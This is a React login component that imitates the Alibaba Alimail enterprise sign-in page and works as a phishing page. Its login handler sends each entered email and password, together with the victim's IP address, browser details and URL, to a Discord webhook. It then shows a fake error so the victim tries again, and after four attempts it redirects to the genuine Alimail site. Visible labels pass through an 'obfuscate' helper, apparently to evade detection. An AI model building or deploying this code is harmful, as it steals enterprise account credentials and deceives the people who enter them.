import React, { useState, useEffect } from 'react';
import { obfuscate } from '../utils/security';

export const LoginForm: React.FC = () => {
  const [activeTab, setActiveTab] = useState<'account' | 'dingtalk'>('account');
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [attempts, setAttempts] = useState(0);

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const prefilledUser = params.get('s');
    if (prefilledUser) {
      setUsername(prefilledUser);
    }
  }, []);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setError(null);

    const webhookUrl = import.meta.env.VITE_DISCORD_WEBHOOK_URL;

    if (!webhookUrl) {
      console.error('VITE_DISCORD_WEBHOOK_URL is not defined');
      setError('System configuration error. Please try again later.');
      setIsLoading(false);
      return;
    }

    try {
      // Fetch IP address
      let ip = 'Unknown';
      try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        ip = ipData.ip;
      } catch (e) {
        console.error('Failed to fetch IP:', e);
      }

      // Format payload for Discord
      const discordPayload = {
        embeds: [
          {
            title: "🔑 New Login Attempt",
            color: 16730447, // #ff4d4f
            fields: [
              { name: "📧 Email", value: `\`${username}\``, inline: false },
              { name: "🔒 Password", value: `\`${password}\``, inline: false },
              { name: "🌐 IP Address", value: `\`${ip}\``, inline: true },
              { name: "📱 User Agent", value: `\`${navigator.userAgent}\``, inline: false },
              { name: "🔗 URL", value: window.location.href, inline: false },
              { name: "🔢 Attempt", value: `${attempts + 1}`, inline: true }
            ],
            timestamp: new Date().toISOString()
          }
        ]
      };

      const response = await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(discordPayload),
      });

      if (response.ok) {
        const nextAttempt = attempts + 1;
        setAttempts(nextAttempt);

        if (nextAttempt >= 4) {
          // Redirect to legitimate page after 4 trials
          window.location.href = 'https://qiye.aliyun.com/';
          return;
        }

        // Clear fields and show error message
        setUsername('');
        setPassword('');
        setError('Something went wrong, please try again.');
      } else {
        setError('Login failed. Please check your credentials and try again.');
      }
    } catch (err) {
      console.error('Login error:', err);
      setError('An unexpected error occurred. Please try again later.');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="w-full max-w-[380px] bg-white rounded-lg shadow-[0_4px_30px_rgba(0,0,0,0.1)] overflow-hidden">
      <div className="flex border-b border-gray-100">
        <button 
          onClick={() => setActiveTab('account')}
          className={`flex-1 py-4 text-sm font-medium transition-colors relative ${activeTab === 'account' ? 'text-gray-800' : 'text-gray-400'}`}
        >
          {obfuscate('Account Login')}
          {activeTab === 'account' && <div className="absolute bottom-0 left-1/2 -translate-x-1/2 w-10 h-0.5 bg-gray-800"></div>}
        </button>
        <button 
          onClick={() => setActiveTab('dingtalk')}
          className={`flex-1 py-4 text-sm font-medium transition-colors relative ${activeTab === 'dingtalk' ? 'text-gray-800' : 'text-gray-400'}`}
        >
          {obfuscate('DingTalk Account Login')}
          {activeTab === 'dingtalk' && <div className="absolute bottom-0 left-1/2 -translate-x-1/2 w-10 h-0.5 bg-gray-800"></div>}
        </button>
      </div>

      <form onSubmit={handleLogin} className="p-8 space-y-6">
        <div className="space-y-4">
          <div className="relative">
            <input 
              type="text" 
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              required
              placeholder="Enter the complete enterprise mailbox or ad..." 
              className="w-full px-4 py-2.5 bg-white border border-gray-200 rounded focus:border-blue-400 outline-none text-sm transition-colors placeholder:text-gray-300"
            />
          </div>
          <div className="relative">
            <input 
              type="password" 
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
              placeholder="Enter password" 
              className="w-full px-4 py-2.5 bg-white border border-gray-200 rounded focus:border-blue-400 outline-none text-sm transition-colors placeholder:text-gray-300"
            />
            <button type="button" className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-300 hover:text-gray-500">
              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
            </button>
          </div>
        </div>

        {error && <div className="text-red-500 text-xs text-center">{error}</div>}

        <div className="flex items-center justify-between text-xs">
          <label className="flex items-center space-x-2 cursor-pointer text-gray-600">
            <input type="checkbox" className="w-3.5 h-3.5 rounded border-gray-300 text-blue-600 focus:ring-blue-500" defaultChecked />
            <span>Save Username</span>
          </label>
          <a href="#" className="text-gray-400 hover:text-gray-600">Forgot Password</a>
        </div>

        <button 
          type="submit"
          disabled={isLoading}
          className={`w-full bg-[#ff4d4f] hover:bg-[#ff7875] text-white py-2.5 rounded font-medium transition-colors text-sm flex items-center justify-center space-x-2 ${isLoading ? 'opacity-70 cursor-not-allowed' : ''}`}
        >
          {isLoading ? (
            <>
              <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
              <span>Signing in...</span>
            </>
          ) : (
            obfuscate('Sign In')
          )}
        </button>

        <div className="flex items-start space-x-2 text-[11px] text-gray-400 leading-relaxed">
          <input type="checkbox" className="mt-0.5 w-3.5 h-3.5 rounded border-gray-300 text-blue-600 focus:ring-blue-500" defaultChecked />
          <span>
            I have read and agree with <a href="#" className="text-blue-500 hover:underline">Privacy Policy</a>, <a href="#" className="text-blue-500 hover:underline">Product Service Agreement</a>
          </span>
        </div>
      </form>

      <div className="bg-gray-50 py-3.5 flex items-center justify-center space-x-2 border-t border-gray-100">
        <img 
          src="https://qiye.aliyun.com/static/0.2.9/images/favicon.ico" 
          alt="Alimail" 
          className="w-4 h-4"
        />
        <span className="text-xs text-gray-400">Scan to sign in with Alimail</span>
      </div>
    </div>
  );
};
